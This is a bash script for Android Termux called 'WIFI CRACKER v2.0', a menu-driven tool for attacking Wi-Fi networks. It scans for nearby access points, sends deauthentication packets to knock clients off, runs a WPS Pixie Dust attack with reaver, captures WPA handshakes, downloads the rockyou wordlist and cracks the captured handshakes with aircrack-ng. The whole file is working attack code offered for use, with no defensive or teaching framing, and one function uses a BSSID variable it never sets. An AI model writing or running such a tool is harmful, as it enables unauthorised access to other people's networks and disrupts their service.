#!/data/data/com.termux/files/usr/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

clear
echo -e "${PURPLE}"
echo "         ██████  ████████    ██████████           ██████   ████████████"
echo "        ██        ██      ██  ██                  ██               ██        "
echo "       ██         ██       ██ ██               ██                 ██"
echo "       ██         ██       ██ ██              ██                  ██"
echo "        ██        ██       ██ ██             ██                   ██"
echo "         ██       ██      ██  ██████████   ██                    ██"
echo "           ██     ██████████   ██            ██                   ██"
echo "            ██    ██           ██             ██                  ██"
echo "   ██        ██  ██           ██              ██                 ██  "
echo "    ██     ████  ██           ██               ██                ██"
echo "      ██████     ██           ██████████             ██████      ██${NC}"
echo -e "${YELLOW}=============================${NC}"
echo -e "${GREEN}        WIFI CRACKER v2.0${NC}"
echo -e "${YELLOW}=============================${NC}"
echo ""

# Check dependencies
check_deps() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    pkg install aircrack-ng wireless-tools termux-api iw -y &>/dev/null
    if ! command -v airodump-ng &> /dev/null; then
        echo -e "${RED}[!] Install: pkg install aircrack-ng${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] Dependencies OK${NC}"
}

# Scan networks
scan_networks() {
    echo -e "${BLUE}[*] Scanning WiFi networks (30s)...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop early${NC}"
    
    # Enable monitor mode (find wlan interface)
    IFACE=$(ip link | grep wlan | cut -d: -f2 | cut -d' ' -f2 | head -1)
    if [ -z "$IFACE" ]; then
        echo -e "${RED}[!] No WiFi interface found!${NC}"
        exit 1
    fi
    
    # Kill interfering processes
    pkill wpa_supplicant &>/dev/null
    airmon-ng stop $IFACE &>/dev/null
    
    # Start monitor mode
    airmon-ng start $IFACE &>/dev/null
    MON_IFACE="${IFACE}mon"
    
    # Scan
    airodump-ng $MON_IFACE --output-format csv -w scan --write-interval 10 &
    SCAN_PID=$!
    sleep 30
    kill $SCAN_PID &>/dev/null
    
    # Stop monitor mode
    airmon-ng stop $MON_IFACE &>/dev/null
    echo -e "${GREEN}[+] Scan complete!${NC}"
}

# Show networks
show_networks() {
    echo ""
    echo -e "${YELLOW}Available Networks:${NC}"
    echo "BSSID           | CH  |  PWR  |  ENC  |  CIPHER  | SSID"
    echo "----------------|-----|-------|-------|----------|--------------------------------"
    
    tail -n +2 scan-01.csv | grep -v "Station MAC" | \
    awk -F, '{
        if ($14 != "") {
            printf "%-15s | %3s | %5s | %-5s | %-8s | %s\n", 
                   $1, $4, $9, $6, $7, $14
        }
    }' | head -20 | column -t -s '|'
}

# Attack menu
attack_menu() {
    while true; do
        clear
        echo -e "${PURPLE}         WIFI CRACKER v2.0${NC}"
        echo -e "${YELLOW}=============================${NC}"
        echo ""
        echo -e "${GREEN}[1]${NC} Scan Networks"
        echo -e "${GREEN}[2]${NC} Show Saved Networks"
        echo -e "${GREEN}[3]${NC} Deauth Attack (WPS/WPA)"
        echo -e "${GREEN}[4]${NC} WPS Pixie Dust Attack"
        echo -e "${GREEN}[5]${NC} WPA Handshake Capture"
        echo -e "${GREEN}[6]${NC} Dictionary Attack"
        echo -e "${GREEN}[0]${NC} Exit"
        echo ""
        
        read -p "Choose: " choice
        
        case $choice in
            1) scan_networks; read -p "Press enter..." ;;
            2) show_networks; read -p "Press enter..." ;;
            3) deauth_attack ;;
            4) pixie_dust ;;
            5) handshake_capture ;;
            6) dictionary_attack ;;
            0) cleanup; exit 0 ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

deauth_attack() {
    read -p "Enter BSSID (xx:xx:xx:xx:xx:xx): " BSSID
    read -p "Enter Channel: " CHAN
    
    IFACE=$(ip link | grep wlan | cut -d: -f2 | cut -d' ' -f2 | head -1)
    airmon-ng start $IFACE &>/dev/null
    MON_IFACE="${IFACE}mon"
    
    echo -e "${YELLOW}[*] Sending deauth packets...${NC}"
    aireplay-ng -0 10 -a $BSSID $MON_IFACE
    airmon-ng stop $MON_IFACE &>/dev/null
}

pixie_dust() {
    echo -e "${YELLOW}[*] WPS Pixie Dust Attack${NC}"
    read -p "Enter BSSID: " BSSID
    read -p "Enter Channel: " CHAN
    
    reaver -i wlan0mon -b $BSSID -c $CHAN -vv -K 1
}

handshake_capture() {
    read -p "Enter BSSID: " BSSID
    read -p "Enter Channel: " CHAN
    read -p "Enter SSID: " SSID
    
    IFACE=$(ip link | grep wlan | cut -d: -f2 | cut -d' ' -f2 | head -1)
    airmon-ng start $IFACE &>/dev/null
    MON_IFACE="${IFACE}mon"
    
    echo -e "${YELLOW}[*] Capturing handshake...${NC}"
    airodump-ng -c $CHAN --bssid $BSSID -w capture $MON_IFACE &
    sleep 10
    
    echo -e "${RED}[*] Sending deauth...${NC}"
    aireplay-ng -0 5 -a $BSSID $MON_IFACE &
    sleep 30
    
    killall airodump-ng
    airmon-ng stop $MON_IFACE &>/dev/null
    
    echo -e "${GREEN}[+] Handshake saved: capture-01.cap${NC}"
}

dictionary_attack() {
    echo -e "${YELLOW}[*] Dictionary Attack${NC}"
    read -p "Enter capture file (cap): " CAPFILE
    read -p "Enter wordlist (default rockyou.txt): " WORDLIST
    
    if [ -z "$WORDLIST" ]; then
        echo "[*] Downloading rockyou.txt..."
        wget -O rockyou.txt http://downloads.skylined.us/wordlists/rockyou.tar.gz && tar -xzf rockyou.tar.gz
        WORDLIST="rockyou.txt"
    fi
    
    echo -e "${GREEN}[*] Cracking with aircrack-ng...${NC}"
    aircrack-ng -w $WORDLIST -b $BSSID $CAPFILE
}

cleanup() {
    rm -f scan-*.csv capture-*.cap &>/dev/null
    airmon-ng stop wlan*mon &>/dev/null
    pkill wpa_supplicant &>/dev/null
}

# Main
check_deps
attack_menu
